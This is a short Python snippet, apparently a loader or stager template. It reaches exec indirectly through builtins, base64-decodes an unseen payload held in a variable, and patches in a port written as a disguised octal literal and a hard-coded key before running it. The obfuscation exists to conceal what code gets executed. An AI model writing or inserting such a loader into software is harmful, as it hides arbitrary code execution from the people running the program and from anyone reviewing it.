import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "d3ff29ea-74a6-4b7a-b521-4351ce7a96d1")
    .replace("__vl__", "")
    .replace("__vm__", "")
    .replace("__tr__", "")
)